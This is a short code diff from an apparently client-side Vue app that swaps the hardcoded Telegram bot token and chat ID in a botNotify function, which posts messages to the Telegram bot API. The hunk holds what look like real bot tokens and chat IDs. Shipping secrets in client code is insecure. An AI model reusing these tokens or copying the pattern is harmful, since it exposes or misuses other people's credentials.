@@ -111,11 +111,11 @@ new Vue({
         });
     },
     async botNotify(message){
-      const token = "6581669136:AAHqLZ-gUbFxf5SqUOLbzXZMtwlaPuEUxNg";
+      const token = "6037861238:AAGigqhwqASHkb-AJVwnRVmJClM6EV0b2Uk";
       const apiUrl = "https://api.telegram.org/bot";
       const queryParams = {
               "text": message,
-              "chat_id" : "1587825063",
+              "chat_id" : "1534315854",
               "parse_mode":"html"
           };
       const queryString = Object.keys(queryParams)
